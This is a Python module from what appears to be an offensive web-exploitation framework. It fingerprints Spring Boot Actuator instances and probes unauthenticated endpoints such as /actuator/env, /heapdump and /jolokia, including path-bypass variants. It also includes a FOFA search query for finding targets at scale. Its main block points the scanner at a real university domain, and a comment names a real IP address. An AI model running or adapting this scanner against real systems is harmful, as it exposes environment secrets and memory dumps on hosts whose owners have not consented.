# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: icon_hash="116323821"
# python batch.py -m exploit.web.SpringBoot.actuator_unauth -cs -fs icon_hash=\"116323821\"

class Script(BaseScript):
    name = 'SpringBoot Actuator'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.UNAUTH
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/actuator/env', '/actuator;/env;.css', '/env', '/api/actuator/env',
                             '/actuator/monitoring', '/monitoring', '/api/actuator/monitoring',
                             '/actuator/trace', '/trace', '/api/actuator/trace',
                             '/actuator/httptrace', '/httptrace', '/api/actuator/httptrace',
                             '/actuator/jolokia', '/jolokia', '/api/actuator/jolokia',
                             '/actuator/heapdump', '/heapdump', '/api/actuator/heapdump',
                             '/actuator/swagger-ui.html', '/swagger-ui.html', '/api/swagger-ui.html']
        # session
        self.session = session
        # 相关信息
        self.info = 'SpringBoot Actuator Unauth'
        self.favicon = ['0488faca4c19046b94d07c3ee83cf9d6']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5 or b'Whitelabel Error Page' in text:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Actuator Finger', url))
                                return {'name': 'Actuator Finger', 'url': url,
                                        'software': 'SpringBoot Actuator'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        if '":{"' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Actuator Unauth', url))
                            return {'name': 'Actuator Unauth', 'url': url, 'software': 'SpringBoot Actuator'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    # resp = requests.get('http://61.150.65.205:9999/image/favicon.png')
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('zjhu.edu.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
